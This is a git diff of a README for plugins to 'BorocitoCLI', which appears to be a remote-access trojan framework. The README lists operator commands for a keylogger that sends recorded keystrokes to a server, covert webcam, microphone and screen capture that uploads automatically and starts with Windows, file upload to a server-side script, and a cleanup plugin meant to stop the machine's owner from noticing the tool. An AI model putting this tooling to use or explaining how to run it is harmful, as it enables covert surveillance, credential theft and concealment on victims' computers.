@@ -7,7 +7,7 @@ These plugins were created to enrich the experience with BorocitoCLI.
 They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.  
 
 ### Using it
-All plugins here were created by Zhenboro. Yeah, and besides the fact that I made them, they need to be installed by 'boro-get'.  
+All plugins present here were originally created by [Zhenboro](https://github.com/Zhenboro). And for its use, it is vital and mandatory to use boro-get, it must be installed in order to use and manage the plugins mentioned here.  
 boro-get is a module within BorocitoCLI. It's totally inside, well implemented. So, initially, there should be no problem.  
 
 ### About
@@ -64,14 +64,17 @@ boro-hear is a module that allows plugins to communicate (one-way C->S) with the
 If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/33632ac2104ceabbc001c9de55fb82cf519842f8/boro-get/Utility.vb#L40-L57).  
 That will start an instance of boro-hear which will send your message to the server. boro-hear is single-instance, but messages can be sent by passing parameters to it. These are picked up by boro-hear via the StartUpNextInstance event.  
 
+**I recommend you install it.** Note that **plugins can work without boro-hear**, but **some plugins are more useful and easier to use with boro-hear** installed, as some of them return information that can be very useful to you.
+*An example of this is broEstoraje. If you compress a folder, broEstoraje will automatically notify you that the compression has finished. Without boro-hear installed, this notification will not occur.*  
+
 ---
 ### broEstoraje
 It is used to perform typical operations of a FileSystem, delete, move, copy, rename and compress in zip.  
 **Compress a folder:**  
 ```sh
-/ZipToDir <folderPath> <zipFilePath(must include extencion)>  
+/DirToZip <folderPath> <zipFilePath(must include extencion)>  
 ```
-Example: /ZipToDir C:\Users\Zhenboro\Desktop C:\Users\Zhenboro\Escroto.zip  
+Example: /DirToZip C:\Users\Zhenboro\Desktop C:\Users\Zhenboro\Escroto.zip  
 
 ---
 **Decompress zip to folder:**  
@@ -119,7 +122,7 @@ Just like the `/Payloads.Upload.File=<filepath>,<null, phpPost>` command. you ca
 ```sh
 /Upload <filePath> 
 ```
-It will be sent to the php fileUpload on the server  
+It will be sent to the `fileUpload.php` on the server  
 
 ---
 ### broKiloger
@@ -132,23 +135,24 @@ Your options are:
 /startrecording: It will start key recording.
 boro-get broKiloger True /startrecording
 ```
+---
 ```sh  
 /stoprecording: It will stop the key recording and broKiloger will close.  
 boro-get broKiloger True /stoprecording  
 ```
 > NOTE: It will not save or send the record.  
-
+---
 ```sh
 /sendrecord: It will send the keylogger and then start recording again.
 boro-get broKiloger True /sendrecord
 ```  
-
+---
 ```sh
 /resetrecord: It will clean the keylogger.
 boro-get broKiloger True /resetrecord
 ```  
 > NOTE: It will not save or send the record.  
-
+---
 ```sh
 /sendandexit: It will send the keylogging and then broKiloger will close.
 boro-get broKiloger True /sendandexit
@@ -201,7 +205,7 @@ This comp will start with windows.
 > NOTE: Single Instance Package  
 
 This plugin is for:  
-- Take photos from a Webcam (not coded yet)  
+- Take photos from a Webcam (it should work)  
 - Record video from a Webcam (not coded yet)  
 - Record microphone
 - Record screen (it should work)  
@@ -228,8 +232,29 @@ boro-get broScrincam True /sendscreenrecord
 boro-get broScrincam True /startcamrecording
 ```  
 ---
+First, you must select a webcam to be able to use it. The `/getcameras` command will return an integer and the MonkierString separated by a |. Then, you can select the camera with the command `/camera <cameraIndex>`
+An example will be:
 ```sh
-/takecampicture: It will take a screenshot of the webcam
+/getcameras
+	Return
+		0|WebCam Name here|@device:sw:{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
+		1|Another camera|@device:sw:{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
+		3|OBS Virtual Camera|@device:sw:{860BB310-5D01-11D0-BD3B-00A0C911CE86}\{A3FCE0F5-3493-419F-958A-ABA1250EC20B}
+Then, select a camera:
+/camera <cameraIndex>
+	Ex.:
+		/camera 0
+	Return
+		Camera 0 is now True (True = Active)
+		Camera 0 is now False (False = No Active Xd)
+Then, and finally, you can use the /TakeCamPicture command.
+```  
+**For return strings, boro-hear must be installed.**
+
+---
+**You must select a camera before using commands related to webcam control**
+```sh
+/takecampicture: It will take a screenshot of the webcam (must select a camera)
 boro-get broScrincam True /takecampicture
 ```  
 > NOTE: It will be sent automatically.  
@@ -380,6 +405,27 @@ Example:
 ```
 (Will remove all subkeys hanging from the "boro-get" key)
 
+### broMaintainer
+This plugin will be useful if you want to clean up the main Borocito folder.   
+
+Many screenshots? Have the log files exceeded one megabyte of data? Does the hard drive sound louder than before? Do you want to prevent someone from noticing the size of Borocito in the Microsoft folder? solved with broMaintainer.   
+Forget about deleting files one by one with `/Windows.FileSystem.Delete=` or worse, using `boro-get broEstoraje True /deletefile,/deletefirectory` (since these don't exist, if you tried it's sad, since you don't read the documentation ).   
+With broMaintainer you can use the following commands:   
+- /fullclear: will delete every
+	- screenshot
+	- log file
+	- boro-get component files
+		- log file
+		- scrincam files
+			- wav
+			- gif
+			- png
+			- avi
+		- boro-get zip install files
+	- Basically everything that is not necessary.  
+ - /boro-get: To remove all residual files from installed plugins
+ - /deletefiles: to delete files in the root folder. need wildcard. (*.jpg, *.png, etc (only one))
+ - /stop: idk why lmao
 
 ## Uninstalling a package
 To uninstall, remove a package, the following points must be taken into account.
